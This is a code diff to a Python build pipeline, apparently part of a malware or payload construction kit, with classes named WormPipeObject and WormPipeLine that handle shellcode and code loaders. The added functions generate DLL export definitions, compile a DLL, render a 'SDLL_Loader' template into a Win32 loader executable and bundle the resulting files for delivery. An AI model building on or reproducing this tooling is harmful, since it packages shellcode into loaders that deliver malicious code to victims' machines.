@@ -1,6 +1,7 @@
 import os
 import shutil
 from typing import Union, Callable
+from jinja2 import Template
 
 from .tools.external_script import ExternalModules
 from .tools.master_wrapper import MasterWrapper
@@ -21,6 +22,13 @@ class WormPipeObject:
         self.work_dir = None
         self.shellcode = None
         self.icon_name = None
+        ### DLL
+        self.dll_name = None
+        self.dll_export = None
+        self.dll_func = []
+        ### List of files for the finished application
+        self._to_dev = []
+
         self.icon_path = self.gvar.get("ICON")
         self.pre_compile = True
         self.comp_script_name = None
@@ -32,6 +40,7 @@ class WormPipeLine:
     def __init__(self, coder: object, worm: object, worm_constructor: object):
         self.coder = coder
         self.worm = worm
+        self.get_item = self.worm.get_item
         self.constructor = worm_constructor
         self.dir_hive = self.constructor.dir_hive
         self.name = self.constructor.name
@@ -175,6 +184,67 @@ class WormPipeLine:
         worm_pipe = mr_comp.make_script(worm_pipe)
         return worm_pipe
     
+    def pipe_prepare_def_file(self, worm_pipe: object) -> object:
+        worm_pipe.dll_name = worm_pipe.var.get("_DLL_NAME")
+        lib_name = worm_pipe.dll_name.split(".")[0] if "." in worm_pipe.dll_name else worm_pipe.dll_name
+        
+        def_path = os.path.join(worm_pipe.work_dir, f"{lib_name}.def")
+        export_fun = []
+        for k,i in worm_pipe.var.items():
+            if k.startswith("_DLL_FUNC_"):
+                export_fun.append(i)
+        exp_fun = "\n\t".join(export_fun)
+        worm_pipe.dll_export = exp_fun
+        worm_pipe.dll_func = export_fun
+        template = f"LIBRARY {lib_name}\nEXPORTS\n\t{exp_fun}"
+        with open(def_path, "w") as file:
+            file.write(template)
+        self.msg("msg", f"Create 'def' file successfull", sender=self.name)
+        return worm_pipe
+    
+    def pipe_make_dll_file(self, worm_pipe: object) -> object:
+        if worm_pipe.gvar.get("NO_COMPILE"):
+            self.msg("msg", "NO_COMPILE FLAG. Skip making DLL file.", sender=self.name)
+            return worm_pipe
+        self.msg("msg", "Prepare DLL file", sender=self.name)
+        worm_pipe = self.pipe_prepare_def_file(worm_pipe)
+        self.msg("msg", "Making DLL file", sender=self.name)
+        worm_pipe = self.constructor.master.multi.compile_dll(worm_pipe)
+        worm_pipe._to_dev.append(os.path.join(worm_pipe.work_dir, worm_pipe.dll_name))
+        return worm_pipe
+    
+    def pipe_make_dll_loader(self, worm_pipe: object) -> object:
+        # worm_pipe.var["_DLL_EXPORT"] = worm_pipe.dll_export
+        if worm_pipe.gvar.get("NO_COMPILE"):
+            self.msg("msg", "NO_COMPILE FLAG. Skip builiding DLL Loader.", sender=self.name)
+            return worm_pipe
+        executor = worm_pipe.var.get("_DLL_EXEC", "SDLL_Loader")
+        executor = self.get_item("support", executor)
+        if not executor:
+            self.msg("error", f"[!!] ERROR: Can't find module: '{executor}' [!!]", sender=self.name)
+            return worm_pipe
+        loader = Template(executor.raw_code)
+        loader = loader.render(worm_pipe.var, DLL_EXPORT=worm_pipe.dll_func)
+        self.msg("msg", f"Making executable DLL loader '{executor.name}'", sender=self.name)
+        worm_pipe.code = loader
+        worm_pipe = self.pipe_save_raw_worm(worm_pipe)
+        worm_pipe = self.constructor.master.multi.compile_win32_extra(worm_pipe)
+        if not worm_pipe.exe_file_path in worm_pipe._to_dev:
+            worm_pipe._to_dev.append(worm_pipe.exe_file_path)
+        return worm_pipe
+    
+    def pipe_sort_app(self, worm_pipe: object) -> object:
+        if len(worm_pipe._to_dev) > 1:
+            self.msg("msg", "Prepare a directory with all the necessary files.", sender=self.name)
+            app_dir = os.path.join(worm_pipe.work_dir, worm_pipe.worm_name)
+            if not os.path.exists(app_dir):
+                os.mkdir(app_dir)
+            for file in worm_pipe._to_dev:
+                shutil.copy2(file, os.path.join(app_dir, os.path.basename(file)))
+                self.msg("no_imp", f"Copying file '{os.path.basename(file)}'", sender=self.name)
+        return worm_pipe
+        
+    
     def add_step(self, name: str) -> None:
         match name:
             case "BASE":
@@ -201,6 +271,12 @@ class WormPipeLine:
                 self.pipeline.append(self.pipe_add_code_loader)
             case "PRE_COMPILER":
                 self.pipeline.append(self.pipe_prepare_compiler)
+            case "MAKE_DEF_FILE":
+                self.pipeline.append(self.pipe_prepare_def_file)
+            case "MAKE_DLL_FILE":
+                self.pipeline.append(self.pipe_make_dll_file)
+            case "DLL_LOADER":
+                self.pipeline.append(self.pipe_make_dll_loader)
             case _:
                 self.msg("error", f"ERROR: Unknown Pipe Process: '{name}'", sender=self.name)
     
@@ -212,6 +288,7 @@ class WormPipeLine:
             if proc == "COMPILER":
                 self.add_step("PRE_COMPILER")
             self.add_step(proc)
+        self.pipeline.append(self.pipe_sort_app)
     
     def update_global_var(self, var: dict, gvar: dict) -> dict:
         for name, value in var.items():
